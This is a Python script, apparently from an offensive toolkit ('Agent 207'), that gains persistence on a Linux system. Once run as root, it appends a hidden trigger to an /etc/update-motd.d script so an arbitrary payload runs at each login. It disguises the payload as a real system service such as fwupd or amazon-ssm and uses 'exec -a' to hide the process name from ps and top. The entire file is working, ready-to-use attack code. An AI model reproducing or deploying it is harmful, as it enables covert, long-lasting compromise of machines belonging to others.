#!/home/dan/Chimera_Project/venv/bin/python3
import os
import sys
import subprocess
import random
import string

class MotDSentinel:
    """
    Agent 207 Pro: Context-Aware MotD Persistence.
    Inspects the environment to masquerade as a legitimate existing 
    service, ensuring the process list remains consistent.
    """
    def __init__(self, payload_cmd):
        self.payload = payload_cmd
        self.target_path = "/etc/update-motd.d/10-help-text"
        
        # Possible personas based on common Linux services
        self.personas = {
            "landscape": "# Update landscape-common profile sync",
            "fwupd": "# Refresh firmware update metadata",
            "unattended-upgrades": "# Verify unattended-upgrades status",
            "amazon-ssm": "# Sync ssm-agent telemetry",
            "default": "# System check-in"
        }

    def _get_best_persona(self):
        """Checks for installed packages or running processes to find a match."""
        try:
            # Check for common service binaries
            if os.path.exists("/usr/bin/landscape-client"):
                return self.personas["landscape"]
            if os.path.exists("/usr/bin/fwupdmgr"):
                return self.personas["fwupd"]
            if os.path.exists("/usr/bin/unattended-upgrade"):
                return self.personas["unattended-upgrades"]
            if os.path.exists("/usr/bin/amazon-ssm-agent"):
                return self.personas["amazon-ssm"]
        except Exception:
            pass
        return self.personas["default"]

    def _generate_trigger(self):
        persona = self._get_best_persona()
        lock_id = ''.join(random.choice(string.digits) for _ in range(5))
        lock_file = f"/run/user/.sys-cache-{lock_id}"
        
        # The 'exec -a' trick: This renames the process in 'ps' and 'top'
        # to match the persona, making it look like a real system tool.
        proc_name = persona.split('# ')[1].split(' ')[0]
        
        # Logic: check lock, run payload as the persona name, touch lock
        return f'{persona}\n[ ! -f {lock_file} ] && {{ (bash -c "exec -a {proc_name} {self.payload}") >/dev/null 2>&1 & touch {lock_file}; }}'

    def execute(self):
        print(f"--- [AGENT 207: SENTINEL MOTD INJECTION] ---")
        
        if os.getuid() != 0:
            print("[!] Error: Root required.")
            return False

        # Attempt to find the primary MotD script
        if not os.path.exists(self.target_path):
            scripts = sorted([os.path.join("/etc/update-motd.d/", f) for f in os.listdir("/etc/update-motd.d/")])
            if not scripts: return False
            self.target_path = scripts[0]

        try:
            trigger = self._generate_trigger()
            
            with open(self.target_path, 'a') as f:
                f.write(f"\n{trigger}\n")
            
            print(f"[!!!] INJECTION SUCCESSFUL: Persona applied to {self.target_path}")
            return True
        except Exception as e:
            print(f"[!] Injection Failed: {e}")
            return False

if __name__ == "__main__":
    if len(sys.argv) < 2:
        sys.exit(1)
    
    MotDSentinel(sys.argv[1]).execute()
